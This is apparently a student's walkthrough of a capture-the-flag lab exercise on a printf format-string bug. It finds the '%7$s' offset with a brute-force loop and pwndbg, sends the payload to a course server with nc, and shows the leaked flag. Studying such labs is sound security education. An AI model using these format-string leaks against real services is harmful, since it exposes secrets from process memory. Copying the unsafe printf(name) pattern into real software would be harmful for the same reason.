# formatstring2 Walkthrough (pwndbg)

This guide shows how to leak the hidden flag string using the format-string bug.

## 1) Read the source and identify the vulnerability

Open `1.c` and focus on:

```c
char* flag = read_flag();
...
char name[24];
scanf("%24s", name);
...
printf(name);
```

Problem:
- `printf(name)` uses user input as a format string.
- This lets us read stack arguments with payloads like `%x` and `%s`.

Goal:
- Print the secret string stored in `flag`.

## 2) Understand what we need to leak

`read_flag()` loads the flag from `flag.txt` and returns a pointer.
In `main`, that pointer is stored in a local variable:

- `char* flag` in C
- stack slot `-0x8(%ebp)` in disassembly

If we can make `printf` treat that pointer as a `%s` argument, it will print the flag.

## 3) Use disassembly to map call sites

Run:

```bash
objdump -d hidden_string | grep -n "<main>" -A120
```

Important instructions in `main`:
- `call read_flag`
- `mov %eax,-0x8(%ebp)` stores pointer to flag string
- first `lea -0x20(%ebp),%eax` prepares `name` for `scanf` input
- second `lea -0x20(%ebp),%eax` prepares `name` for vulnerable `printf(name)`

Why there are two `lea` instructions with the same operands:
- `lea` means "load effective address". It computes an address and stores it in a register.
- Here, `lea -0x20(%ebp),%eax` means: put the address of local buffer `name` into `eax`.
- The compiler needs that same address twice:
  - once before `__isoc99_scanf` (write user input into `name`)
  - once before `_IO_printf` (use `name` as format string)
- Same instruction text does not mean same purpose; context is determined by the call that follows.

## 4) Find the correct format index

Bruteforce `%N$s` locally:

```bash
for i in $(seq 1 20); do
  payload="%${i}\$s"
  out=$( (printf '%s\n' "$payload" | ./hidden_string) 2>/dev/null | tail -n 1 )
  printf '%2d -> %s\n' "$i" "$out"
done
```

Working index for this binary:
- `%7$s`

Why this works:
- the 7th stack argument resolves to the local `flag` pointer at the vulnerable call.

Troubleshooting if your loop prints blank lines:
- If `flag.txt` is missing locally, the program can crash in `read_flag()` before it reaches the vulnerable print.
- A loop like `2>/dev/null | tail -n 1` can hide those crashes, making every index look blank.
- Use this safer check while testing:

```bash
for i in $(seq 1 20); do
  payload="%${i}\$s"
  out=$(printf '%s\n' "$payload" | ./hidden_string 2>&1)
  printf '%2d -> %s\n' "$i" "$(printf '%s' "$out" | tr '\n' ' ')"
done
```

On a valid local setup (with `flag.txt` present), index 7 shows:
- `Hello, <flag>, how are you?`

## 5) pwndbg proof (where each value is)

Create input file:

```bash
printf '%%7$s\n' > in.txt
```

Start pwndbg:

```bash
gdb -q ./hidden_string
```

In pwndbg:

```gdb
b *0x08049a23
run < in.txt
p/x *(char**)($ebp-0x8)
x/s *(char**)($ebp-0x8)
```

Why breakpoint is `b *0x08049a23` and not `0x08049a01`:
- `0x08049a01` is the first `lea -0x20(%ebp),%eax`, which belongs to the `scanf` setup block.
- Right after that first `lea`, the code does:
  - `push %eax`
  - `push <"%24s">`
  - `call __isoc99_scanf`
- `0x08049a23` is the second `lea -0x20(%ebp),%eax`, immediately before:
  - `push %eax`
  - `call _IO_printf`
- We break at `0x08049a23` because that is the vulnerable `printf(name)` call path.
- Yes, your intuition is correct: it is the one after input is read and between the prompt print and vulnerable print.

What this shows:
- `*(char**)($ebp-0x8)` is the `flag` pointer.
- `x/s` at that pointer shows the actual flag string in memory.

## 6) Exploit locally

```bash
printf '%%7$s\n' | ./hidden_string
```

Expected behavior:
- Program prints `Hello, <flag>, how are you?`

## 7) Exploit remote target

Target:
- host: `moa6.eecs.utk.edu`
- port: `32110`

Quick command:

```bash
printf '%%7$s\n' | nc moa6.eecs.utk.edu 32110
```

Verified output:

```text
What's your name? Hello, cosc466-flag-{HqeXx3gG}, how are you?
```

## 8) Commented script (remote)

Use:

```bash
/home/jbenjam7/cs466/.venv/bin/python exploit.py
```

The script is fully commented and follows the same manual steps:
- connect
- wait for prompt
- send `%7$s`
- print response

## 9) Cleanup notes

If you created local test files while debugging:

```bash
rm -f in.txt flag.txt
```

Only remove these if they were temporary files you created for local testing.
